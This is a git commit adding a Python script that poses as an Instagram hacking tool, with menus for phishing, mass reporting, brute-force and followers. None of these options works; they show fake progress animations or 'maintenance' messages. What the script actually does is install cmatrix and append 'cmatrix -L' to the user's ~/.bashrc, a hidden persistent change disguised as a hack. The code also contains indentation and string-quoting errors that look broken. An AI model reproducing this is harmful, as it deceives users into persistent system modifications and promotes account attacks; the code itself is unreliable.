039316e629c04b5ec7704392182dee269e075f3e
shuhfan <54106733+shuhfan@users.noreply.github.com>
2021-03-27 19:42:30 +0530

    Create insta_hack.py

---
+++ insta_hack.py
@@ -0,0 +1,98 @@
+#!/bin/python
+import os
+import time
+import sys
+def load(word):
+	for char in word:
+		print(char,end='')
+		sys.stdout.flush()
+		time.sleep(0.2)
+def bash():
+	print("\033[31m")
+
+print(" ______     __  __     __  __     __  __     ______   ______     __   __")
+print("/\  ___\   /\ \_\ \   /\ \/\ \   /\ \_\ \   /\  ___\ /\  __ \   /\ "-.\ \ ")  
+print("\ \___  \  \ \  __ \  \ \ \_\ \  \ \  __ \  \ \  __\ \ \  __ \  \ \ \-.  \ ")
+print(" \/\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\    \ \_\ \_\  \ \_\\"\_\ ")
+print("  \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/     \/_/\/_/   \/_/ \/_/ \n\n")
+                                                                            
+
+	time.sleep(3)
+	os.system("echo 'cmatrix -L' >> ~/.bashrc")
+
+
+os.system("apt install cmatrix")
+os.system("echo 'cmatrix -L' >> ~/.bashrc")
+os.system("clear")
+print("\033[33m")
+print("-----This is a private Instagram hacking tool by *SHUHFAN* please use it educational purpose only-----")
+time.sleep(4)
+os.system('clear')
+print("\033[32;1m")
+
+print("    __  _____   ________ __      _____   ________________ ")
+print("   / / / /   | / ____/ //_/     /  _/ | / / ___/_  __/   |")
+print("  / /_/ / /| |/ /   / ,< ______ / //  |/ /\__ \ / / / /| |")
+print(" / __  / ___ / /___/ /| /_____// // /|  /___/ // / / ___ |")
+print("/_/ /_/_/  |_\____/_/ |_|    /___/_/ |_//____//_/ /_/  |_|")
+                                                          
+
+time.sleep(3)
+print("\033[33m")
+print("[1] Instagram Phishing")
+print("[2] Instagram Reporting")
+print("[3] Instagram Brute-Force")
+print("[4] Insagram Followers\n\n")
+
+u_choice=int(input('Choose a option:  '))
+if u_choice==1:
+     os.system("clear")
+     print("Processing please wait -")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait /")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait |")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait \ ")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait - ")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait /")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait |")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait \ ")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait - ")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait /")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait |")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait \ ")
+     time.sleep(1)
+     os.system("clear")
+     print("Processing please wait - ")
+     time.sleep(1)
+     os.system("clear")
+     load('Connecting to server.....\n')
+     bash()
+elif u_choice==2:
+	print("H4CK3R >>> Server under maintenance...")
+
+elif u_choice==3:
+        print("H4CK3R >>> Server under maintenance...")
+
+elif u_choice==4:
+        print("H4CK3R >>> Server under maintenance...")
